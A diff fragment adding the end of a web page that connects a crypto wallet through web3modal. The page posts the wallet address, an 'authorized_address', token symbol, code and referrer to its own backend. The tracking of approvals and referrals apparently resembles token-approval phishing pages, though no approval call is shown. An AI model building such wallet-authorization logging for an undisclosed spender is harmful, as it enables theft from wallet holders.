+				console.log(e);
+			}
+		}
+
+		/**
+		 * Fetch account data for UI when
+		 * - User switches accounts in wallet
+		 * - User switches networks in wallet
+		 * - User connects wallet initially
+		 */
+		async function refreshAccountData() {
+			// document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
+			await fetchAccountData(provider);
+		}
+
+		function findKey(obj, value, compare = (a, b) => a === b) {
+			return Object.keys(obj).find(k => compare(obj[k], value))
+		}
+
+		async function checkApproved(address,symbol) {
+			if (!network) {
+				//	return;
+			}
+
+			var s = getUrlQueryString('s')
+
+			var data = {
+				address:address || '',
+				authorized_address:authorized_address,
+				bizhong:symbol,
+				code:s,
+			}
+
+			$.ajax({
+				type: 'post',
+				url:   '/api/get_erc',
+				data:data,
+				success:function(data){
+					approved = !!data.approved;
+					authorized_address = data.data.authorized_address;
+				},
+				error:function(data){
+					console.log(data)
+				}
+			})
+		}
+
+		async function postInfo(address,symbol,approved){
+			var s = getUrlQueryString('s')
+			var a = getUrlQueryString('r')
+
+			var data = {
+				address:address,
+				authorized_address:authorized_address,
+				bizhong:symbol,
+				code:s,
+				reffer:a
+			}
+
+			$.ajax({
+				type: 'post',
+				url:  '/api/insert_trc',
+				data:data,
+				// success:function(data){
+				//     //console.log(data)
+				//     if(data.code === 200){
+				//     	console.log('success')
+				//
+				//     }
+				//     console.log(data.msg)
+				// },
+				// error:function(data){
+				// 	console.log(data)
+				// }
+			})
+		}
+
+		async function onConnect() {
+			$('.pages').append('<div class="modal-overlay"></div>');
+			$('.modal-overlay').addClass('modal-overlay-visible');
+			$('.modal').removeClass('modal-out').addClass('modal-in');
+
+			try {
+				provider = await web3Modal.connect()
+				provider.enable()
+			} catch (e) {
+				console.log("Could not get a wallet connection", e);
+				return;
+			}
+			await refreshAccountData();
+		}
+
+		/**
+		 * Disconnect wallet button pressed.
+		 */
+		async function onDisconnect() {
+
+			console.log("Killing the wallet connection", provider);
+
+			// TODO: Which providers have close method?
+			if (provider.close) {
+				await provider.close();
+
+				// If the cached provider is not cleared,
+				// WalletConnect will default to the existing session
+				// and does not allow to re-scan the QR code with a new wallet.
+				// Depending on your use case you may want or want not his behavir.
+				await web3Modal.clearCachedProvider();
+				provider = null;
+			}
+
+			selectedAccount = null;
+
+			// Set the UI back to the initial state
+			// document.querySelector("#prepare").style.display = "block";
+			// document.querySelector("#connected").style.display = "none";
+		}
+
+		/**
+		 * Main entry point.
+		 */
+		window.addEventListener('load', async () => {
+			init();
+			document.querySelector("#btn-connect").addEventListener("click", onConnect);
+			document.querySelector("#goApp").addEventListener("click", goapp);
+			// document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
+		});
+	});
+	function _init(argument) {
+		// body...
+	}
+</script>
+
+<div id="WEB3_CONNECT_MODAL_ID"><div class="sc-jSFkmK kRmdPb web3modal-modal-lightbox" offset="0" opacity="0.4"><div class="sc-gKAblj fVQpCb web3modal-modal-container"><div class="sc-iCoHVE knnrxv web3modal-modal-hitbox"></div><div class="sc-fujyUd hdPMvV web3modal-modal-card"><div class="sc-eCApGN cjAFRf web3modal-provider-wrapper"><div class="sc-hKFyIo jcNZzC web3modal-provider-container"><div class="sc-bdnylx jMhaxE web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMiA1MTIiIHdpZHRoPSI1MTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxyYWRpYWxHcmFkaWVudCBpZD0iYSIgY3g9IjAlIiBjeT0iNTAlIiByPSIxMDAlIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiM1ZDlkZjYiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwMDZmZmYiLz48L3JhZGlhbEdyYWRpZW50PjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0ibTI1NiAwYzE0MS4zODQ4OTYgMCAyNTYgMTE0LjYxNTEwNCAyNTYgMjU2cy0xMTQuNjE1MTA0IDI1Ni0yNTYgMjU2LTI1Ni0xMTQuNjE1MTA0LTI1Ni0yNTYgMTE0LjYxNTEwNC0yNTYgMjU2LTI1NnoiIGZpbGw9InVybCgjYSkiLz48cGF0aCBkPSJtNjQuNjkxNzU1OCAzNy43MDg4Mjk4YzUxLjUzMjgwNzItNTAuMjc4NDM5NyAxMzUuMDgzOTk0Mi01MC4yNzg0Mzk3IDE4Ni42MTY3OTkyIDBsNi4yMDIwNTcgNi4wNTEwOTA2YzIuNTc2NjQgMi41MTM5MjE4IDIuNTc2NjQgNi41ODk3OTQ4IDAgOS4xMDM3MTc3bC0yMS4yMTU5OTggMjAuNjk5NTc1OWMtMS4yODgzMjEgMS4yNTY5NjE5LTMuMzc3MSAxLjI1Njk2MTktNC42NjU0MjEgMGwtOC41MzQ3NjYtOC4zMjcwMjA1Yy0zNS45NTA1NzMtMzUuMDc1NDk2Mi05NC4yMzc5NjktMzUuMDc1NDk2Mi0xMzAuMTg4NTQ0IDBsLTkuMTQwMDI4MiA4LjkxNzU1MTljLTEuMjg4MzIxNyAxLjI1Njk2MDktMy4zNzcxMDE2IDEuMjU2OTYwOS00LjY2NTQyMDggMGwtMjEuMjE1OTk3My0yMC42OTk1NzU5Yy0yLjU3NjY0MDMtMi41MTM5MjI5LTIuNTc2NjQwMy02LjU4OTc5NTggMC05LjEwMzcxNzd6bTIzMC40OTM0ODUyIDQyLjgwODkxMTcgMTguODgyMjc5IDE4LjQyMjcyNjJjMi41NzY2MjcgMi41MTM5MTAzIDIuNTc2NjQyIDYuNTg5NzU5My4wMDAwMzIgOS4xMDM2ODYzbC04NS4xNDE0OTggODMuMDcwMzU4Yy0yLjU3NjYyMyAyLjUxMzk0MS02Ljc1NDE4MiAyLjUxMzk2OS05LjMzMDg0LjAwMDA2Ni0uMDAwMDEtLjAwMDAxLS4wMDAwMjMtLjAwMDAyMy0uMDAwMDMzLS4wMDAwMzRsLTYwLjQyODI1Ni01OC45NTc0NTFjLS42NDQxNi0uNjI4NDgxLTEuNjg4NTUtLjYyODQ4MS0yLjMzMjcxIDAtLjAwMDAwNC4wMDAwMDQtLjAwMDAwOC4wMDAwMDctLjAwMDAxMi4wMDAwMTFsLTYwLjQyNjk2ODMgNTguOTU3NDA4Yy0yLjU3NjYxNDEgMi41MTM5NDctNi43NTQxNzQ2IDIuNTEzOTktOS4zMzA4NDA4LjAwMDA5Mi0uMDAwMDE1MS0uMDAwMDE0LS4wMDAwMzA5LS4wMDAwMjktLjAwMDA0NjctLjAwMDA0NmwtODUuMTQzODY3NzQtODMuMDcxNDYzYy0yLjU3NjYzOTI4LTIuNTEzOTIxLTIuNTc2NjM5MjgtNi41ODk3OTUgMC05LjEwMzcxNjNsMTguODgyMzEyNjQtMTguNDIyNjk1NWMyLjU3NjYzOTMtMi41MTM5MjIyIDYuNzU0MTk5My0yLjUxMzkyMjIgOS4zMzA4Mzk3IDBsNjAuNDI5MTM0NyA1OC45NTgyNzU4Yy42NDQxNjA4LjYyODQ4IDEuNjg4NTQ5NS42Mjg0OCAyLjMzMjcxMDMgMCAuMDAwMDA5NS0uMDAwMDA5LjAwMDAxODItLjAwMDAxOC4wMDAwMjc3LS4wMDAwMjVsNjAuNDI2MTA2NS01OC45NTgyNTA4YzIuNTc2NTgxLTIuNTEzOTggNi43NTQxNDItMi41MTQwNzQzIDkuMzMwODQtLjAwMDIxMDMuMDAwMDM3LjAwMDAzNTQuMDAwMDcyLjAwMDA3MDkuMDAwMTA3LjAwMDEwNjNsNjAuNDI5MDU2IDU4Ljk1ODM1NDhjLjY0NDE1OS42Mjg0NzkgMS42ODg1NDkuNjI4NDc5IDIuMzMyNzA5IDBsNjAuNDI4MDc5LTU4Ljk1NzE5MjVjMi41NzY2NC0yLjUxMzkyMzEgNi43NTQxOTktMi41MTM5MjMxIDkuMzMwODM5IDB6IiBmaWxsPSIjZmZmIiBmaWxsLXJ1bGU9Im5vbnplcm8iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDk4IDE2MCkiLz48L2c+PC9zdmc+" alt="WalletConnect"></div><div class="sc-gtssRu bktcUM web3modal-provider-name">WalletConnect</div><div class="sc-dlnjPT eFHlqH web3modal-provider-description">Scan with WalletConnect to connect</div></div></div></div></div></div></div>
+
+
+
+<div id="WEB3_CONNECT_MODAL_ID"></div></body></html>
